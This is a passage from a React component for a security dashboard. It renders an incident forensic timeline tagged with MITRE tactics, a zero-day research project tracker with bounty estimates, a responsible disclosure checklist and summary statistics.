                              <SelectTrigger className="mt-1"><SelectValue /></SelectTrigger>
                              <SelectContent>{["critical", "high", "medium", "info"].map(s => <SelectItem key={s} value={s}>{s}</SelectItem>)}</SelectContent>
                            </Select>
                          </div>
                          <div><Label className="text-xs">MITRE Tactic</Label>
                            <Select value={newEvent.mitre_tactic} onValueChange={v => setNewEvent(p => ({ ...p, mitre_tactic: v }))}>
                              <SelectTrigger className="mt-1"><SelectValue placeholder="Optional" /></SelectTrigger>
                              <SelectContent>{mitreTactics.map(t => <SelectItem key={t.id} value={t.id}>{t.id}: {t.name}</SelectItem>)}</SelectContent>
                            </Select>
                          </div>
                        </div>
                        <Button onClick={handleAddEvent} disabled={!newEvent.event_description || addEvent.isPending} className="w-full">
                          {addEvent.isPending ? "Adding..." : "Add Event"}
                        </Button>
                      </div>
                    </DialogContent>
                  </Dialog>
                </div>
              </CardHeader>
              <CardContent>
                {!selectedIncident ? (
                  <p className="text-sm text-muted-foreground text-center py-8">Create or select an incident to view its forensic timeline.</p>
                ) : incidentEvents.length === 0 ? (
                  <p className="text-sm text-muted-foreground text-center py-8">No events yet. Add the first event to start the timeline.</p>
                ) : (
                  <div className="relative">
                    <div className="absolute left-[72px] top-0 bottom-0 w-px bg-border" />
                    <div className="space-y-1">
                      {incidentEvents.map((event, i) => {
                        const matchedTactic = mitreTactics.find(t => t.id === event.mitre_tactic);
                        return (
                          <motion.div key={event.id} initial={{ opacity: 0, x: -20 }} animate={{ opacity: 1, x: 0 }} transition={{ delay: i * 0.06 }}
                            className={cn("flex items-start gap-4 p-3 rounded-xl transition-colors hover:bg-muted/30", selectedTactic && event.mitre_tactic !== selectedTactic && "opacity-30")}
                          >
                            <code className="text-xs font-mono text-muted-foreground w-14 shrink-0 pt-0.5">{event.event_time}</code>
                            <div className="relative z-10 shrink-0 mt-1"><div className={cn("h-3 w-3 rounded-full ring-2 ring-background", sevDot(event.severity))} /></div>
                            <div className="flex-1 min-w-0">
                              <p className="text-sm text-foreground">{event.event_description}</p>
                              <div className="flex items-center gap-2 mt-1">
                                <Badge className={cn("text-[9px] px-1.5 py-0", sevColor(event.severity))}>{event.severity}</Badge>
                                {matchedTactic && <Badge variant="outline" className="text-[9px] px-1.5 py-0 font-mono" style={{ borderColor: matchedTactic.color + "60", color: matchedTactic.color }}>{matchedTactic.id}: {matchedTactic.name}</Badge>}
                              </div>
                            </div>
                          </motion.div>
                        );
                      })}
                    </div>
                  </div>
                )}
              </CardContent>
            </Card>
          </div>
        </TabsContent>

        {/* TAB: BUG BOUNTY */}
        <TabsContent value="bug-bounty">
          <Suspense fallback={<TabLoader />}><BugBountyTracker /></Suspense>
        </TabsContent>

        {/* TAB: CHEAT SHEETS */}
        <TabsContent value="cheatsheets">
          <Suspense fallback={<TabLoader />}><SecurityCheatSheets /></Suspense>
        </TabsContent>

        {/* TAB: ZERO-DAY LAB — Real Data */}
        <TabsContent value="zero-day">
          <div className="space-y-6">
            <Card className="border-border bg-card">
              <CardHeader>
                <div className="flex items-center justify-between">
                  <CardTitle className="flex items-center gap-2"><FlaskConical className="h-5 w-5 text-secondary" /> Research Projects</CardTitle>
                  <Dialog open={showAddResearch} onOpenChange={setShowAddResearch}>
                    <DialogTrigger asChild>
                      <Button size="sm" variant="outline" className="gap-1 h-7 text-xs"><Plus className="h-3 w-3" /> New Project</Button>
                    </DialogTrigger>
                    <DialogContent>
                      <DialogHeader><DialogTitle>Create Research Project</DialogTitle></DialogHeader>
                      <div className="space-y-3">
                        <div><Label className="text-xs">Project Code</Label><Input value={newResearch.project_code} onChange={e => setNewResearch(p => ({ ...p, project_code: e.target.value }))} placeholder="e.g. ZD-2026-005" className="mt-1 font-mono" /></div>
                        <div><Label className="text-xs">Target</Label><Input value={newResearch.target} onChange={e => setNewResearch(p => ({ ...p, target: e.target.value }))} placeholder="e.g. Chrome V8 Engine" className="mt-1" /></div>
                        <div><Label className="text-xs">Vulnerability Type</Label><Input value={newResearch.vulnerability_type} onChange={e => setNewResearch(p => ({ ...p, vulnerability_type: e.target.value }))} placeholder="e.g. Type Confusion" className="mt-1" /></div>
                        <div className="grid grid-cols-2 gap-3">
                          <div><Label className="text-xs">Status</Label>
                            <Select value={newResearch.status} onValueChange={v => setNewResearch(p => ({ ...p, status: v }))}>
                              <SelectTrigger className="mt-1"><SelectValue /></SelectTrigger>
                              <SelectContent>{["fuzzing", "analyzing", "poc-ready", "disclosed"].map(s => <SelectItem key={s} value={s}>{s}</SelectItem>)}</SelectContent>
                            </Select>
                          </div>
                          <div><Label className="text-xs">Est. Bounty ($)</Label><Input type="number" value={newResearch.estimated_bounty} onChange={e => setNewResearch(p => ({ ...p, estimated_bounty: Number(e.target.value) }))} className="mt-1" /></div>
                        </div>
                        <Button onClick={handleCreateResearch} disabled={!newResearch.target || !newResearch.vulnerability_type || createResearch.isPending} className="w-full">
                          {createResearch.isPending ? "Creating..." : "Create Project"}
                        </Button>
                      </div>
                    </DialogContent>
                  </Dialog>
                </div>
              </CardHeader>
              <CardContent>
                {researchProjects.length === 0 ? (
                  <p className="text-sm text-muted-foreground text-center py-8">No research projects yet. Start your first zero-day hunt!</p>
                ) : (
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    {researchProjects.map((entry, i) => (
                      <motion.div key={entry.id} initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: i * 0.05 }} className="p-4 rounded-xl border border-border hover:border-secondary/40 transition-colors">
                        <div className="flex items-center justify-between mb-3">
                          <div className="flex items-center gap-2">
                            <code className="text-xs font-mono font-bold text-secondary">{entry.project_code}</code>
                            <Badge className={cn("text-[9px]", entry.status === "poc-ready" ? "bg-success/15 text-success border-success/30" : entry.status === "analyzing" ? "bg-warning/15 text-warning border-warning/30" : entry.status === "fuzzing" ? "bg-primary/15 text-primary border-primary/30" : "bg-muted text-muted-foreground")}>{entry.status}</Badge>
                          </div>
                          <span className="text-sm font-bold text-success font-mono">${Number(entry.estimated_bounty).toLocaleString()}</span>
                        </div>
                        <h4 className="text-sm font-semibold text-foreground">{entry.target}</h4>
                        <p className="text-xs text-muted-foreground mb-3">{entry.vulnerability_type}</p>
                        <div className="flex items-center justify-between text-xs text-muted-foreground mb-1"><span>Progress</span><span className="font-mono">{entry.progress}%</span></div>
                        <Progress value={entry.progress} className="h-1.5" />
                        <div className="flex gap-2 mt-3">
                          {entry.progress < 100 && (
                            <Button size="sm" variant="outline" className="text-[10px] h-6 px-2" onClick={() => updateResearch.mutate({ id: entry.id, progress: Math.min(entry.progress + 10, 100) })}>
                              +10%
                            </Button>
                          )}
                          {entry.status !== "disclosed" && entry.progress >= 90 && (
                            <Button size="sm" variant="outline" className="text-[10px] h-6 px-2" onClick={() => updateResearch.mutate({ id: entry.id, status: "disclosed", progress: 100 })}>
                              Mark Disclosed
                            </Button>
                          )}
                        </div>
                      </motion.div>
                    ))}
                  </div>
                )}
              </CardContent>
            </Card>

            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              <Card className="border-secondary/20 bg-gradient-to-br from-secondary/5 to-card">
                <CardHeader><CardTitle className="flex items-center gap-2 text-base"><BookOpen className="h-5 w-5 text-secondary" /> Responsible Disclosure</CardTitle></CardHeader>
                <CardContent className="space-y-4">
                  <div className="space-y-3">
                    {[
                      { step: 1, label: "Discovery & PoC", desc: "Confirm vulnerability and build minimal proof-of-concept" },
                      { step: 2, label: "Vendor Notification", desc: "Report to vendor via security@vendor.com with 90-day window" },
                      { step: 3, label: "Coordination", desc: "Work with vendor on patch development and CVE assignment" },
                      { step: 4, label: "Public Disclosure", desc: "Publish advisory after patch or after 90-day window expires" },
                    ].map(s => (
                      <div key={s.step} className="flex items-start gap-3">
                        <div className="w-7 h-7 rounded-full bg-secondary/20 flex items-center justify-center shrink-0">
                          <span className="text-xs font-bold text-secondary">{s.step}</span>
                        </div>
                        <div><h4 className="text-sm font-semibold text-foreground">{s.label}</h4><p className="text-xs text-muted-foreground">{s.desc}</p></div>
                      </div>
                    ))}
                  </div>
                  <Button variant="outline" className="w-full gap-2 text-xs"><Shield className="h-3.5 w-3.5" /> Generate Disclosure Report</Button>
                </CardContent>
              </Card>

              {/* Research Stats — computed from real data */}
              <Card className="border-border bg-card">
                <CardHeader><CardTitle className="flex items-center gap-2 text-base"><TrendingUp className="h-5 w-5 text-primary" /> Research Summary</CardTitle></CardHeader>
                <CardContent>
                  <div className="grid grid-cols-2 gap-3">
                    {[
                      { label: "Total Projects", value: researchProjects.length.toString(), color: "text-primary" },
                      { label: "PoC Ready", value: researchProjects.filter(r => r.status === "poc-ready").length.toString(), color: "text-success" },
                      { label: "Analyzing", value: researchProjects.filter(r => r.status === "analyzing").length.toString(), color: "text-warning" },
                      { label: "Disclosed", value: researchProjects.filter(r => r.status === "disclosed").length.toString(), color: "text-muted-foreground" },
                      { label: "Avg Progress", value: researchProjects.length > 0 ? `${Math.round(researchProjects.reduce((s, r) => s + r.progress, 0) / researchProjects.length)}%` : "0%", color: "text-accent" },
                      { label: "Total Bounty Est.", value: `$${researchProjects.reduce((s, r) => s + Number(r.estimated_bounty), 0).toLocaleString()}`, color: "text-success" },
                    ].map((stat, i) => (
                      <div key={i} className="p-3 rounded-xl bg-muted/30 border border-border">
                        <span className="text-[10px] text-muted-foreground uppercase tracking-wider">{stat.label}</span>
                        <p className={cn("text-lg font-black font-mono mt-1", stat.color)}>{stat.value}</p>
                      </div>
                    ))}
                  </div>
                </CardContent>
              </Card>
            </div>
          </div>
        </TabsContent>
      </Tabs>
    </div>
  );
};

export default CyberCommandCenter;
